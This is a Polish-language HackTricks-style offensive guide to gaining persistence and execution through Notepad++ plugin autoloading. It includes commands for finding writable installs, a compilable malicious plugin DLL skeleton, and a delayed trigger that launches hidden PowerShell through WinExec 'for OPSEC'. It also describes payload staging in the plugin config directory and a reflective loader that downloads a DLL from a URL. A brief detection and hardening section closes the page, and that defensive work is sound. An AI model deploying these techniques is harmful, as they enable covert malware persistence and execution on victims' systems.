# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ będzie **autoloadować każdy plugin DLL znaleziony w jego podfolderach `plugins`** przy uruchomieniu. Umieszczenie złośliwego pluginu w dowolnej **zapisywalnej instalacji Notepad++** daje code execution wewnątrz `notepad++.exe` za każdym razem, gdy edytor startuje, co można wykorzystać do **persistence**, ukrytego **initial execution** albo jako **in-process loader**, jeśli edytor jest uruchomiony z podniesionymi uprawnieniami.

Od **Notepad++ 7.6+** oczekiwany układ ręcznej instalacji to **jeden podfolder na plugin** (`plugins\<PluginName>\<PluginName>.dll`). W **portable mode** (obecność `doLocalConf.xml` obok `notepad++.exe`) cały tree aplikacji pozostaje lokalny dla tego katalogu, co często zamienia skopiowane/paczki narzędzi admina w łatwo zapisywalną przez usera powierzchnię execution.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (zwykle wymaga admina do zapisu).
- Writable opcje dla operatorów z niskimi uprawnieniami:
- Użyj **portable Notepad++ build** w folderze zapisywalnym przez usera.
- Skopiuj `C:\Program Files\Notepad++` do ścieżki kontrolowanej przez usera (np. `%LOCALAPPDATA%\npp\`) i uruchom `notepad++.exe` stamtąd.
- Szukaj **admin tool bundles**, rozpakowanych kopii zip lub help-desk toolkitów, które już zawierają `doLocalConf.xml` i znajdują się poza `Program Files`.
- Każdy plugin dostaje własny podfolder w `plugins` i jest ładowany automatycznie przy starcie; pozycje menu pojawiają się w **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Punkty ładowania pluginu (execution primitives)
Notepad++ oczekuje określonych **wyeksportowanych funkcji**. Wszystkie są wywoływane podczas inicjalizacji, dając wiele powierzchni wykonania:
- **`DllMain`** — uruchamia się natychmiast przy załadowaniu DLL (pierwszy punkt wykonania).
- **`setInfo(NppData)`** — wywoływana raz przy ładowaniu, aby przekazać uchwyty Notepad++; typowe miejsce do rejestracji pozycji menu.
- **`getName()`** — zwraca nazwę pluginu pokazywaną w menu.
- **`getFuncsArray(int *nbF)`** — zwraca komendy menu; nawet jeśli jest pusta, jest wywoływana podczas startu.
- **`beNotified(SCNotification*)`** — odbiera zdarzenia Notepad++ / Scintilla (przydatne do odroczenia payloads do czasu akcji użytkownika lub zdarzenia edytora).
- **`messageProc(UINT, WPARAM, LPARAM)`** — handler wiadomości, przydatny przy większych wymianach danych.
- **`isUnicode()`** — flaga zgodności sprawdzana przy ładowaniu.

Większość exportów można zaimplementować jako **stuby**; wykonanie może nastąpić z `DllMain` albo z dowolnego callbacka powyżej podczas autoload.

## Minimalny złośliwy szkielet pluginu
Skompiluj DLL z oczekiwanymi exportami i umieść ją w `plugins\\MyNewPlugin\\MyNewPlugin.dll` w zapisywalnym folderze Notepad++:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Zbuduj DLL (Visual Studio/MinGW).
2. Utwórz podfolder plugin pod `plugins` i wrzuć tam DLL.
3. Uruchom ponownie Notepad++; DLL zostanie załadowany automatycznie, uruchamiając `DllMain` i kolejne callbacki.

## Low-noise trigger pattern via `beNotified`
Dla OPSEC wiele payloadów powinno **nie** uruchamiać się z `DllMain`. Cichszym patternem jest pozwolić pluginowi załadować się normalnie, a następnie wykonać kod dopiero po realistycznym evencie edytora, takim jak **startup complete**, **buffer activation** albo **first typed character**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
To lepiej pasuje do publicznych ofensywnych badań niż hałaśliwy beacon `DllMain`: DLL nadal jest automatycznie ładowany przy starcie, ale złośliwe działanie jest opóźnione, aż Notepad++ wygląda na rzeczywiście używany.

## Using the plugin config directory as secondary storage
Notepad++ udostępnia `NPPM_GETPLUGINSCONFIGDIR`, które zwraca **katalog konfiguracji pluginów bieżącego użytkownika**. Złośliwy plugin może użyć tego do utrzymania minimalnego DLL na dysku, jednocześnie przechowując zaszyfrowaną konfigurację, staged payloads lub tasking files w ścieżce, która wtapia się w normalny stan pluginu.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operationalnie jest to przydatne, gdy chcesz:
- mały autoloaded bootstrap DLL;
- per-user tasking bez ponownego dotykania głównego binarnego pluginu;
- oddzielić **autoload trigger** od cięższego drugiego etapu.

## Reflective loader plugin pattern
Weaponized plugin może zamienić Notepad++ w **reflective DLL loader**:
- Udostępnij minimalny element UI/menu (np. "LoadDLL").
- Akceptuj **file path** lub **URL** do pobrania payload DLL.
- Reflectively mapuj DLL do bieżącego procesu i wywołuj eksportowany punkt wejścia (np. funkcję loadera wewnątrz pobranego DLL).
- Zaleta: użycie benign-looking procesu GUI zamiast uruchamiania nowego loadera; payload dziedziczy integralność `notepad++.exe` (w tym podwyższone konteksty).
- Wady: wrzucenie **unsigned plugin DLL** na dysk jest głośne; praktyczną wariacją jest użycie autoloaded plugin tylko jako stub i trzymanie właściwego implant zaszyfrowanego/staged gdzie indziej.

## Detection and hardening notes
- Blokuj lub monitoruj **writes to Notepad++ plugin directories** (w tym portable copies w profilach użytkowników); włącz controlled folder access lub application allowlisting.
- Alarmuj na **new unsigned DLLs** w `plugins`, zmiany w drzewach portable Notepad++ oraz nietypową **child processes/network activity** z `notepad++.exe`.
- Ustal baseline dla legalnych pluginów i badaj każdy nowy DLL, który eksportuje normalny interfejs Notepad++ plugin, ale dodatkowo uruchamia shell, PowerShell lub network beacons.
- Wymuszaj instalację pluginów wyłącznie przez **Plugins Admin** i ogranicz uruchamianie portable copies z niezaufanych paths.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
